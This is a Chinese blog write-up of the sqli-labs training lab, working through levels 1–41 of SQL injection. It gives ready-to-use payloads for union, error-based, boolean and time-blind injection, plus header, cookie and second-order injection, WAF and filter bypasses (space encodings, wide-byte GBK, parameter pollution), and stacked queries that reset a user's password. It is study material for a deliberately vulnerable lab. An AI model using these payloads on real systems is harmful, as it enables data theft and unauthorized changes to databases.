---
layout:    post
title:     sqli-labs
subtitle:  学习学习
date:      2020-10-23
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tage:
    - 学习
---

####  一、SQL注入类型判断（前提了解）

+ 数字型注入
+ 字符型注入

1.数字型：输入 id=1 and 1=1 和 1=2进行判断，首先在URL中输入？id=1 and 1=1 页面显示正常，后输入id=1 and 1=2 页面出错，说明注入类型为数字型。<br>

原因如下：当输入 and 1=1时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=1;<br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and 1=2时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=2;<br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

若为字符型输入上述语句，后台执行sql语句：<br>

select*from <> where id ='1 and 1=1';<br>

select*from <> where id = '1 and 1=2';<br>

查询语句将and语句全部转换为字符串，不会进行逻辑判断，所以不会显示错误。<br>

2.字符型：输入 and '1'='1 和 and '1'='2来判断. 。当输入and '1'='1时页面正常，输入 and '1'='2后错误，说明注入类型为字符型。<br>

原因如下：当输入 and '1'='1时，sql语句为：<br>

select*from <> where id = 'x' and '1'='1'; <br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and '1'='2时，sql语句为：<br>

select*from <> where id = 'x' and '1'='2'; <br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

#### Less-1

​    1.使用hackbar,首先输入id= 1,显示正常，接着输入id=1 and 1=2判断是否为数字型注入，发现不是。

​    2.输入id=1' 显示错误，说明为字符型注入。

​    3.用--+注释掉后面的’，输入id=1' order by x --+ （x=1,2,3,4）,判断字段，发现有3个字段。

​	4.id=-1' union select 1,2,3 --+，判断回显（要让系统使用联合查询，要使前面id错误（如id=-1等错误id）来进行后面的查询语句）。回显位为2，3位。

​	5.id=-1' union select 1,database(),3 --+,查询数据库名称。

​	6.id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+,得到表名。

​	7.id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+,得到列名。

​	8.id=-1' union select 1,(select group_concat(username,password) from security.users),3 --+,成功。

#### Less-2

​	1.判断注入，输入id=1 and 1=2，报错，数字型注入。

​	2.步骤同Less-1。

#### Less-3

​	1.判断注入，发现是基于 ') 的字符注入。id=1') --+。

​	2.步骤同Less-1。

#### Less-4

​	1.判断注入，为基于 ") 的字符注入。 id=1") --+。

​	2.步骤同Less-1。

#### Less-5

##### 	基础知识:

   1.floor(): 去除小数部分。

2. rand ():产生随机数。
3. limit 0,1 表示输出第一个数据。0表示输出起始位置，1表示输出一个。
4. rand(x): 每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可以预测的。
5. floor报错payload: and select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
6. floor(rand(0)*2)x ,x 为 floor(rand(0)*2)的别名。
7. payload的重点在group by a，也就是group by floor(rand(0)2)。首先，floor(rand(0)2)的意思是随机产生0或1。虽说是随机，但是它是有规律可循的。rand(0)，虽说是随机数，但是它的值与执行rand(0)的次数是意义对应的，即每一次执行rand(0)得到的结果都是固定的。基本是011011…这个序列。
8. 具体解释来自：https://blog.csdn.net/qq_43504939/article/details/90046342?utm_medium=distribute.wap_relevant.none-task-blog-title-2

#####    注入:

1. ?id=1正常  接着 ?id=1' --+发现可以。

   2.?id=1' order by x --+  ,判断字段列数。得到列数为：3。

   3.?id=1' union select 1,2,3 --+ ，无回显，但之前判断字段可以发现有报错回显，所以采用报错注入。

   4.?id=1' and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ ,payload为要输入的查询语句。注意：输出的字符长度限制为64个字符。

   5.?id=1' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 提示信息超出一行。

   6.?id=1' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  得到数据库名。

   7.?id=1' and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema='security'),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  报错显示不能超过一行。

   8.?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  用limit一个一个显示。 得到表名。

   9.?id=1' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+  得列名。

   10.?id=1' and (select 1 from (select count(*),concat((select username from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+ 逐个得出账号密码。

#### Less-6

   1.基于 " 的报错注入。

   2.将id=1' 改为id=2'  其余与Less-5相同。

#### Less-7

#### Less-8

#####   基础知识:

​	1.substr(a,b,c): 在a中从b位开始取c位。

​	2.ascii(a): 将a转化为ascii。

#####   注入:

   1.基于 ' 的布尔盲注。

   2.?id=1正常， ?id=1'错误无提示，?id=1' --+正常。

   3.发现页面对 对错 都没有回显但页面显示不一样，所以采用布尔盲注。

   4.?id=1' order by x--+ (x=1,2,3,4) 得到有三列字段（看页面）。

   5.?id=1' and length(database())=8 ,判断数据库名的长度。

​	6.?id=1' and substr(database(),1,1)='s' --+ 判断数据库名，通过改变substr里位置来猜名。或 ?id=1' and ascii(substr(database(),1,1))=115 --+ 用ascii来猜测库名。

​	7.同理猜测出表名，列名，账号密码。

#### Less-9

#####   基础知识:

​	1.sleep(x): 执行后，睡眠x秒后执行。

​	2.if(a,b,c): 如果a正确，b执行否则c执行。

#####   注入:

​	1.基于 ’ 的时间盲注。

​	2.?id=1 ,?id=1' 发现不论对错不会回显且不会产生变化，采用时间盲注。

​	3.?id=1 and sleep(5) --+ ,?id=1' and sleep(5) --+ 判断闭合。

​	4.?id=1' and if(length(database())=8,1,sleep(5)) --+ ，判断数据库名长度。

​	5.?id=1' and if(substr(database(),1,1)='s',1,sleep(5)) --+ ,判断数据库名。或 ?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+ ，判断数据库名。通过改变substr的步长来逐步猜测。

​	6.?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5)) --+ ,判断表名。改变limit，substr步数逐步判断。

​	7.同理得到列名，账号密码。

#### Less-10

​	1.基于 " 的时间盲注。

​	2.?id=1" 其余与Less-9相同。

#### Less-11

#####   前言：

  1.进入post的世界。

  2.采用万能密码可以直接登陆。 为：admin' or '1'='1'。

  3.我这里使用的是hackbar进行的post注入，burp抓包也可以。注意：注释不能用--+会出错，要采用#代替。

#####    注入：

​	1.基于 ' 的post注入。

​	2.查看源码发现账户名为: uname,密码名为: passwd,提交为: submit=Submit。

​	3.采用post注入，uname=admin&passwd=admin&submit=Submit ,回显成功。

​	4.判断注入类型，uname=admin' #&passwd=admin&submit=Submit 正确。

​	5.uname=admin' order by x #&passwd=admin&submit=Submit (x=1,2,3) ,得到字段为2。

​	6.uname=-admin' union select 1,2 #&passwd=admin&submit=Submit ,判断回显。

​	7.uname=admin' union select 1,database() #&passwd=admin&submit=Submit ，查找数据库名。

​	8.uname=admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #&passwd=admin&submit=Submit  ,查找表名。

​	9.uname=admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&passwd=admin&submit=Submit ,查找列名。

​	10.uname=admin' union select 1,username from security.users limit 0,1 #&passwd=admin&submit=Submit ,因为有行数限制，用limit逐个查询。

#### Less-12

​	1..基于 ") 的post注入。

​	2.将uname=admin' 改为 uname=admin") 即可，其余与Less-11相同。

#### Less-13

​	1.基于 ‘) 的报错注入。

​	2.先判断出闭合类型为 ") ，后进行order by x 判断列数为2。

​	3.无回显，有报错提示，所以使用报错注入。

​	4.uname=admin’) and updatexml(1,concat(0x7e,database(),0x7e),1) #&passwd=admin&submit=Submit ,得到数据库名。

​	5.uname=admin‘) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&passwd=admin&submit=Submit ,得到表名。

​	6.uname=admin’) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) #&passwd=admin&submit=Submit   ,得到列名。

​	7.uname=admin‘) and updatexml(1,concat(0x7e,(select username from security.users limit 0,1 ),0x7e),1) #&passwd=admin&submit=Submit   ， 因为有行数限制，用limit逐个查询。

#### Less-14

​	1.基于的 " 报错注入。

​	2.其余同Less-13。

#### Less-15

​	1.基于 ' 的时间盲注。

​	2.发现uname=admin' # 正确。

​	3.发现无报错信息，正确与错误页面不同，因此采用时间盲注。

​	4.uname=admin' and if(length(database())=8,1,sleep(5)) #&passwd=admin&submit=Submit  ,判断数据库名长度。

​	5.uname=admin' and if(substr((select database()),1,1)='s',1,sleep(5)) #&passwd=admin&submit=Submit ,逐步判断数据库名。

或(这个正确方法，上一个偷懒了哈哈) uname=admin' and if(ascii(substr((select database()),1,1))=115,1,sleep(5)) #&passwd=admin&submit=Submit  ,逐步通过ASCII判断字符，改变=，< ,> ，来判断。

​	6.其余也一样，改变查询逐步判断。

#### Less-16

​	1.基于 ")  的post时间盲注。

​	2.其余与Less-15同。

#### Less-17

​	1.基于 ' 的密码报错注入。

​	2.测试时发现账号处无法注入了，查看源码发现check_input()过滤了uname,但passwd没有，所以对passwd采用报错注入。

​	3.uname=admin&passwd=admin' updatexml(1,concat(0x7e,database(),0x7e),1) #&submit=Submit  ,查看数据库名。

​	4.同理查询表名，用户名，密码，具体与Less-13同。

#### Less-18

​	1.基于 ' 的  User-Agent 报错注入。

​	2.注入发现uname,passwd都无法注入，查看源码，发现对我们的uname,passwd都进行了过滤。

​	3.提示 User-Agent ，所以在 User-Agent 上进行注入。

​	4.',1,updatexml(1,concat(0x7e,database(),0x7e),1))# ,通过报错查询数据库名。

​	5.',1,updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1))#  ,limit 使用来一个一个查询表名，因为不用的话有提示只能输出一行。

​    6.',1,updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1))#  ,查询列名。

​	7.',1,updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1))#  查询用户密码。

#### Less-19

​	1.基于 ' 的  Referer 报错注入。

​	2.将 User-Agent 变为 Referer，其余与Less-18一致。

#### Less-20

​	1.基于 ' 的 Cookie  注入。

​	2.在 cookie 中进行，uname=admin' order by x# (x=1,2,3,4)  ,查询，与Less-1差不多。

#### Less-21

​	1.基于 ') 的cookie的base64编码注入。

​	2.将Less-20中的payload转化base64编码即可。

#### Less-22

​	1.基于 " 的cookie的base64编码注入。

​	2.同上。

#### Less-23

​		1.过滤注释的get型注入。

​		2.对 --+ # 进行了过滤。

​		3.用 or进行闭合。

​		4.?id=1' union select 1,database(),3 or '1'='1 。

#### Less-24

​	1.二次注入。

​	2.注册用户名为 admin '# ，密码随意

​	3.更改密码，后用 用户名admin 密码为更改密码，登陆成功。

​	原理：当注册时对用户名进行了过滤，但进入数据库的内容还是我们自己输入的，并没有改变，当我们更改密码时，系统调用了数据库里的数据，这时我们注册的 admin '# 被代入SQL语句，就会将admin密码更改，就成功注入。

#### Less-25

​	1.过滤 or 和 and 的 ' 注入。

​	2.?id=-1' union select 1,2,3--+  等等。没什么影响，遇到order可以双写oorrder来防止过滤。

​	3.也可以用 and or 双写就行。

#### Less-25a

​	1.过滤 or 和 and 的注入。

​	2.?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3

​	3.继续操作。

#### Less-26

##### 	    知识点：

​	1.空格绕过方法：     

```
+ 可以代替空格 这里好像不行
%a0 空格
%09 tab键（水平）
%0a	新建一行
%0c	新建一页
%0d	return 功能
%0b	tab键（垂直）
```

 2. and 可以用 && 代替。（hackbar中输入&&时，要进行URL编码为%26%26，否则会出现报错）

 3. or 可以用 || 代替。

 4. -- 可以用 ;%00 代替。

 5. and,or 也可以双写绕过。

    ##### Payload:

    1.?id=1 正常显示。

    2.?id=1' 显示错误，提示为 ’包含。

    3.?id=1' --+  页面还是显示之前的语法错误。且显示输入语句为?id=1' 说明进行了过滤。

    4.查看源码，发现其对or ,and ,/* ,-- ,# ,/ ,\\\,空格进行了过滤。

    ```
    function blacklist($id)
    {
    	$id= preg_replace('/or/i',"", $id);	
    //strip out OR (non case sensitive)
    	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
    	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
    	$id= preg_replace('/[--]/',"", $id);		//Strip out --
    	$id= preg_replace('/[#]/',"", $id);			//Strip out #
    	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
    	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
    	return $id;
    }
    ```

    ​	5.?id=1'%a0oorrder%0aby%a0x;%00+ (x=3,4) 用其他代替空格注释等,得到有3个字段。

    ​	6.?id=0'%a0union%0aselect%a01,2,3;%00+ ,联合查询回显位置。

    ​	7.?id=0'%a0union%0aselect%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%where%a0table_schema=database()),3;%00+ ,查表名。

    ​	8.后续同上格式不变，改变具体查询即可。

    

#### Less-26a

​	1.和上一关基本一样，就是没有错误回显。

​	2.尝试后知道为 ') 的闭合。

​	3.还是和上关一样过滤了一些字符。

​	4.?id=0')%a0union%0aselect%a01,database(),3;%00+ ,基本一致与上一关。

#### Less-27

​	1.对union和select也进行了过滤，不过or没有。可以双写uunionnion和大小写绕过SElect。

​	2.?id=0'%a0uunionnion%0aSElect%a01,database(),3;%00+

​	3.select 好像不能双写（我没成功） union双写，大小写过滤都行。

#### Less-27a

​	1.?id=1' 页面没有发生变化，改为?id=1"后发生错误，注释后正常，所以为 “的闭合方式。

​	2.与上一关一样，只是id包裹变为 " 。

#### Less-28

​	1.id 包裹变为 ') ,其余不变(select,union正常使用，不用绕过)。

#### Less-28a

​	1.啊这  我这个和上一关一毛一样？？

#### Less-29

##### 	知识点：

​	1.服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。

工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。

接下来是参数解析的问题。
问：index.php?id=1&id=2，这时回显是id=1还是id=2呢？
答：apache (php) 解析最后一个参数，即回显id=2；tomcat (jsp) 解析第一个参数，即回显id=1。

服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。

工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。

接下来是参数解析的问题。
问：index.php?id=1&id=2，这时回显是id=1还是id=2呢？
答：apache (php) 解析最后一个参数，即回显id=2；tomcat (jsp) 解析第一个参数，即回显id=1。

问：index.jsp?id=1&id=2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？
答：此处应该还是id=2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。

而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。

而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&id=0 or 1=1--+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1--+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。

该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。  

​									----来源MySQL注入天书之服务器两层架构

##### 	Payload:

​	1.在开始前选择login.php文件，否则与第一关一样了

 login.php?id=1&id=-1' union select 1,database(),3 --+ ,然后逐步注入。

#### Less-30

​	1.id的包裹变为 " 其他与上一关一样。

login.php?id=1&id=-1" union select 1,database(),3 --+

#### Less-31

​	2.id的包裹变为 ") 其他与上一关一样。

login.php?id=1&id=-1") union select 1,database(),3 --+

#### Less-32

​	1.宽字节注入。

```
function check_addslashes($string)
{
$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);  //escape any backslash
$string = preg_replace('/\'/i', '\\\'', $string);   //escape single quote with a backslash
$string = preg_replace('/\"/', "\\\"", $string);//escape double quote with a backslash
  

return $string;
}
```

​	对 /, ', " 进行了过滤。

​	通常，一个GBK编码汉字，占用2个字节。

​	mysql在使用GBK编码时，会认为两个字符为一个汉字。例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。

​	在%5c%27前添加%df构成%df%5c%27 (%5c : \\的编码，%27：'的编码)，mysql在GBK编码时，会将两个字节(%df%5c)当作一个汉字，从而将\去除。 (也可以使用 %bf, %81,%82等)



#####   Payload:

​	1.?id=1%df' ,得到语法错误提示 id为 ' 包裹。

​	2.?id=1%df' order by x --+ (x=1,2,3,4) 判断字段。

​	3.?id=0%df' union select 1,2,3 --+ ,看回显位置。然后同之前步骤解决。

​	4.查询列名时采用16进制绕过''需求，将 users 转换为16进制，其他照常。

#### Less-33

​	addslashes()函数，addslashes(string)返回在预定义字符之前家反斜杠\字符串：

  + 单引号 ’

  + 双引号 "

  + 反斜杠 \

  + 空字符 null

    注入和上一关一样。

#### Less-34

​	与上32关一样，不过采用post注入。

#### Less-35

​	1.判断为数字型注入。（?id=1 and 1=2 报错）

​	2.还是存在过滤，有函数addslashes() 函数对预定字符过滤与33一样。 （没什么影响罢了）

​	3.正常注入即可。（查列名时还是要对users进行十六进制转化绕过''过滤）

#### Less-36

​	1.用mysql_real_escape_string()函数转义SQL语句中的字符串的特殊字符：

  \x00, \n, \r , \, ', ", \x1a

  成功，函数返回被转义的字符串，失败，返回falsa。

​	2.注入同32，也是单引号包裹。

#### Less-37

​	1.改为post注入。

#### Less-38

##### 	堆叠注入：

	+ 介绍与原理:

​	 可以理解为多条SQL语句一起使用。（MySQL的多语句查询）在SQL中，分号(;) 是语句结束的标志，我们可以在一条语句的后方加上; 继续构造下一语句。

​	 堆叠语句与union联合注入区别为：union执行的语句类型是有限的，而堆叠注入可以执行任意语句。

​	 堆叠注入之前要知道数据库的一些相关信息，如：表名，列名等信息。 因为代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或结果只能被忽略，我们在前端界面无法看到返回结果。

  + 使用条件

    mysql_multi_query() 执行多条查询的函数--防止注入改为mysql_query()函数。

    堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用**mysqli_multi_query()**函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。

#####     Payload:

​	 1.?id=-1' union select 1,database(),3 --+ ,正常查询出表名，列名，用户名，密码。

​	2.?id=1';update users set password='123' where username='Dumb'; --+ ,采用堆叠注入，查询的同时修改了Dumb的密码为：123，后查询发现成功修改。

#### Less-39

​	1.判断为数字型注入。

​	2.正常注入得到表名等。

​	3.同38，堆叠注入，还是与38同。（改为数字型）

#### Less-40

​	1.判断注入类型。

​	2.?id=1' 页面错误但无回显内容，?id=1' --+ 页面还是错误，说明还有闭合符， ?id=1') --+ ，成功。

​	3.之后同38。

#### Less-41

​	1.?id=1 and 1=2 ,页面错误，说明为数字型注入。

​	2.同39。  （堆叠注入也可以插入数据比如插入用户什么的。）

#### Less-42



#### Less-43



#### Less-44



#### Less-45